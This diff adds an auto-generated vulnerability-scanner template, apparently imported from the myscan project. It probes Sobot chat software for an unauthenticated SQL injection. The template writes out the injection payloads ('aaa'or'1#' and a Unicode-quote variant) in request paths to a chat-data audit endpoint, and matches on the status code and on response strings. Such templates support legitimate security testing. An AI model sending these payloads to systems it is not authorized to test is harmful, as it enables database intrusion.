@@ -1,0 +1,25 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-sobot-unauth_sql_injection
+info:
+  name: "Sobot unauth_sql_injection"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, sobot, ref-poc, sqlinjection]
+  description: "由参考项目脚本静态导入：Sobot/unauth_sql_injection（类型 SQLINJECTION）。 原脚本另含 favicon 指纹 ['6f7196420eb72dbb66f263a2e85c3cb5']，本引擎暂不支持 favicon 匹配。"
+http:
+  - method: GET
+    path:
+      - "/chat-data/cut/getAllStatusAuditData?serviceGroupId=aaa%27or%271%23&pageNo=1&pageSize=5"
+      - "/chat-data/cut/getAllStatusAuditData?serviceGroupId=aaa%E2%80%99or%E2%80%980%23&pageNo=1&pageSize=5"
+      - "/console/favicon.ico"
+      - "/console/login"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "/console/"
+          - "zcBox"
